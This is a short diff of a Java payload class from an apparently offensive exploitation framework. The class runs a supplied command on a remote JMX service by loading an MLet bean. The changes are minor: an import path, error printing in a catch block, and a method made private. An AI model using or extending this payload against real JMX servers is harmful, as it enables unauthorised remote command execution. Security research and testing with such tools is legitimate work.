@@ -1,6 +1,6 @@
 package com.lucifaer.jokerframework.modules.payloads.jmx;
 
-import com.lucifaer.jokerframework.data.JmxDataModel;
+import com.lucifaer.jokerframework.data.ExploitDataModel.JmxDataModel;
 import com.lucifaer.jokerframework.modules.Payload;
 import com.lucifaer.jokerframework.server.jmx.JmxClient;
 
@@ -13,7 +13,9 @@ public class JmxCommand implements Payload {
         try {
             exploit();
         }
-        catch (Exception e) {}
+        catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
@@ -21,7 +23,7 @@ public class JmxCommand implements Payload {
         this.jmxClient = (JmxClient) object;
     }
 
-    public void exploit() throws Exception {
+    private void exploit() throws Exception {
         echo("[INFO] Loading " + JmxDataModel.mletBean.getClassName());
         echo("[INFO] Executing command: " + JmxDataModel.command);
         String[] mletParams = {JmxDataModel.command};
